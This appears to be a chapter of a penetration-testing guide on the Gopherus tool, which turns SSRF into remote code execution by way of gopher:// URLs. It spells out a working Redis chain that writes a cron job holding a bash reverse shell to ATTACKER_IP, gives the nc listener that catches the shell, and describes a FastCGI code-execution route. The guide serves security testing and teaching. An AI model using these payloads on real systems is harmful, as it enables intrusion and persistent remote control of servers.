# 06 — Gopherus (Gopher Payload Generator)

Gopherus (`tarunkant/Gopherus`) doesn't exploit anything by itself — it
**generates `gopher://` URLs** that, when fed into an SSRF-vulnerable
parameter, smuggle raw TCP protocol commands to internal services that speak a
plaintext/line-based protocol (Redis, MySQL, SMTP, FastCGI, Memcached,
Zabbix). Understanding *why* the Gopher scheme enables this is more important
than memorizing the tool's menu options, so this file leads with the mechanism.

## Why the Gopher Protocol Is the Vehicle for This

The Gopher protocol (RFC 1436), from the pre-web era, has an extremely
permissive client behavior baked into virtually every HTTP library that
implements it: a `gopher://` URL lets you specify **arbitrary raw bytes** to
send to **any host:port**, with no protocol-specific formatting requirement
from the client's side. The client just opens a TCP connection and sends
whatever's in the URL's "selector" portion.

```
gopher://TARGET_HOST:TARGET_PORT/_RAW_BYTES_TO_SEND
```

| Part | What it does | Why it matters |
|---|---|---|
| `gopher://` | The scheme. | Many HTTP client libraries (`curl`, PHP's stream wrappers, Java's `URLConnection`) historically support Gopher as a side effect of supporting many schemes generically — and crucially, **SSRF filters that only think about `http://`/`https://` frequently never block `gopher://` at all**, because nobody expects it. |
| `TARGET_HOST:TARGET_PORT` | The actual internal destination — e.g. `127.0.0.1:6379` for a local Redis instance. | This is exactly the SSRF target you've already identified (internal IP + port) using the techniques in files 02–03. |
| `_` (leading underscore in the selector) | A required artifact of Gopher's original protocol design (the selector string), but in practice client implementations treat everything after it as the raw payload to transmit. | This is the part that makes Gopher dangerous: it's effectively "send these exact bytes to this exact TCP socket," with the gopher-client wrapper adding almost nothing of its own. That turns SSRF — normally limited to "make an HTTP request" — into "speak any plaintext line-based protocol to any reachable host." |
| `RAW_BYTES_TO_SEND` (URL-encoded) | The literal protocol commands for whatever service you're targeting — e.g. Redis's own wire protocol commands. | This is what Gopherus actually generates for you — correctly formatted and URL-encoded raw protocol bytes for the service you select, so you don't have to hand-craft Redis/MySQL wire-protocol syntax yourself. |

**The one-sentence mechanism:** Gopher turns "fetch a URL" into "open a raw TCP
socket and send these exact bytes" — and that's the only primitive you need to
talk to Redis, SMTP, or any other plaintext protocol that doesn't require TLS
or a complex handshake.

## Installation

```
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
chmod +x install.sh
./install.sh
```

| Part | What it does |
|---|---|
| `git clone ...` | Pulls the tool source. |
| `chmod +x install.sh` | Marks the install script executable (clone doesn't preserve this on all systems/filesystems). |
| `./install.sh` | Runs the installer, which sets up the Python environment/dependencies the tool needs. |

## Usage and Flags

```
python2 gopherus.py --exploit <service>
```

(Note: depending on the cloned version/fork, this may run under `python` or
`python2` rather than `python3` — Gopherus is an older tool with Python 2
heritage; check the repo's own README at clone time for the exact invocation
your copy expects.)

| Flag | Takes a value? | What it does |
|---|---|---|
| `--help` | No | Prints usage help. |
| `--exploit <service>` | Yes — one of: `mysql`, `fastcgi`, `redis`, `zabbix`, `pymemcache`, `rbmemcache`, `phpmemcache`, `dmpmemcache`, `smtp` | Selects which back-end service's protocol Gopherus should craft a payload for. The tool then runs an **interactive prompt** asking for the specific details it needs for that exploit (e.g., for `redis`: the local file path to write; for `mysql`: a username; for `fastcgi`: the PHP file path on the victim system). |

## Walkthrough: Redis Exploitation

```
python2 gopherus.py --exploit redis
```

Gopherus prompts you interactively (no extra CLI flags needed for the specific
payload content — it asks questions and builds the payload itself), typically
offering two outcomes: writing a malicious cron job (for a reverse shell) or
writing a PHP web shell file, depending on what's reachable on the target.

### What it generates and why, broken down

Conceptually, the underlying Redis protocol commands Gopherus assembles for
the cron-job/reverse-shell route look like this (this is what's *inside* the
gopher URL it builds for you):

```
FLUSHALL
SET 1 "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1\n\n"
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
```

| Command | What it does | Why it's part of the chain |
|---|---|---|
| `FLUSHALL` | Wipes all existing Redis keys/data. | Clears the way so the subsequent `SAVE` writes a clean, predictable RDB file containing only the attacker's injected data — avoids corrupting the write with leftover legitimate keys. |
| `SET 1 "..."` | Stores a string value (a literal cron job line, wrapped in extra newlines) under key `1`. | Redis's RDB persistence format will serialize this string value verbatim into the dump file Redis writes to disk — the trick is making that string *also* be syntactically valid as a crontab entry once it lands in the right directory. |
| `*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1` | A standard cron schedule (every minute) running a Bash reverse-shell one-liner. | `bash -i` opens an interactive shell; `>& /dev/tcp/IP/PORT` redirects both stdout and stderr into a TCP socket opened to the attacker (Bash's built-in `/dev/tcp` pseudo-device); `0>&1` redirects stdin from that same socket back into the shell — together these three pieces form a complete, self-contained reverse shell with no external binary (like `nc`) required on the target. |
| `CONFIG SET dir /var/spool/cron/` | Changes Redis's working directory for persistence to the system's actual cron-job directory. | Redis, if running as a privileged-enough user, will happily write its RDB dump file anywhere its process has filesystem permissions to — pointing this at the cron directory is what turns "writing a Redis backup file" into "planting a cron job." |
| `CONFIG SET dbfilename root` | Sets the output filename for the next save to `root`. | Crontab directories conventionally hold one file per user (e.g., `/var/spool/cron/root`) — naming it `root` makes the resulting file get picked up as that user's crontab once cron re-reads the directory. |
| `SAVE` | Forces Redis to immediately write its in-memory dataset to disk, to the directory/filename just configured. | This is the actual write operation — after this, the cron job is on disk in a location and filename cron will read, and the malicious schedule executes on the target's next minute tick. |

Gopherus encodes this entire command sequence as the raw bytes portion of a
single `gopher://TARGET:6379/_...` URL, with each command line correctly
terminated per Redis's wire protocol so that, when the vulnerable SSRF
parameter fetches that URL, the bytes hit the Redis socket exactly as if you'd
typed them into `redis-cli` yourself.

### Listener for the reverse shell

Once the gopher payload above has been delivered through the SSRF and the
cron job lands, you need to actually catch the resulting connection:

```
nc -lvnp ATTACKER_PORT
```

| Flag | What it does |
|---|---|
| `-l` | Listen mode. |
| `-v` | Verbose — show connection details when something connects. |
| `-n` | Skip DNS resolution (purely numeric IP handling, faster/cleaner for this use case). |
| `-p ATTACKER_PORT` | The local port to bind, matching the port embedded in the cron payload above. |

Within roughly one minute of the gopher payload being delivered (cron's
minimum granularity), the planted job fires and the reverse shell connects
back to this listener.

## Walkthrough: FastCGI Exploitation (Conceptual)

```
python2 gopherus.py --exploit fastcgi
```

Prompts for a PHP file path that's already present on the victim filesystem
(it ships a default). The generated gopher payload speaks the FastCGI binary
wire protocol directly to port 9000, instructing the FastCGI process manager
to execute that PHP file with attacker-supplied parameters — if the FastCGI
port is exposed with no authentication (a common misconfiguration when it's
assumed to only ever be reached from the local web server, which is exactly
the assumption SSRF breaks), this yields direct PHP code execution.

## Real-World Notes

- The single most important practical fact in this file: **`gopher://` support
  is the actual differentiator between "SSRF that can read internal HTTP
  responses" and "SSRF that can achieve RCE on internal infrastructure."** When
  testing any SSRF, always check whether the vulnerable URL-fetching code path
  supports non-HTTP schemes at all — many modern HTTP client libraries
  (`requests` in Python with default adapters, many Java HTTP clients) do
  **not** support Gopher out of the box, which is itself a meaningful
  real-world mitigation; PHP's `curl` extension and Java's legacy
  `URLConnection`/old Apache HttpClient configurations have historically been
  the most commonly exploitable in the wild.
- Because Redis by default (pre-hardening) requires no authentication and
  often runs as a privileged service account in internal deployments, the
  Redis module above is the most commonly cited real-world Gopher/SSRF RCE
  chain — it shows up repeatedly in CTFs, bug bounty writeups, and red team
  reports as the canonical "SSRF to RCE" escalation.
- This is precisely the same underlying primitive SSRFmap's `redis`, `mysql`,
  and `fastcgi` modules automate (file 05) — Gopherus and SSRFmap solve the
  same problem from two different angles: Gopherus is a focused, interactive,
  single-payload generator; SSRFmap is a broader automation framework that
  includes Gopher-based modules alongside non-Gopher ones (cloud metadata
  readers, port scanners). In practice many testers use Gopherus to
  hand-craft and understand a specific payload, then SSRFmap to automate
  delivery and chaining once the technique is confirmed working.
